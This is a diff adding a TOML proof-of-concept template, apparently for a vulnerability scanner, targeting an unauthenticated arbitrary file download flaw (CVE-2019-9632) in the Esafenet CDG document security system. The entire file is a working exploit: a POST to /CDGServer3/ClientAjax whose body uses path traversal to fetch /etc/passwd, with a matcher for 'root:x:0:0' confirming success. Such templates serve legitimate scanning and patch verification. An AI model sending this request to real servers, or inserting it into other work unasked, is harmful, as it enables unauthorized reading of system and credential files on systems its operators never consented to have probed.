@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "通过构造恶意请求利用 /CDGServer3/ClientAjax 接口中的 InstallationPack 参数，在无需身份认证的情况下远程下载服务器上的任意敏感文件。"
+id = "POC-AVE-2019-0215"
+name = "亿赛通 CDG 电子文档安全管理系统任意文件下载漏洞 PoC"
+severity = "high"
+tags = ["ave-2019-0215"]
+vuln_id = [
+    "CVE-2019-9632",
+    "AVE-2019-0215",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/CDGServer3/ClientAjax"
+protocol = "http"
+
+[poc.requests.body]
+content = "InstallationPack=download.jsp&fileName=../../../../../../../../etc/passwd"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:x:0:0"]
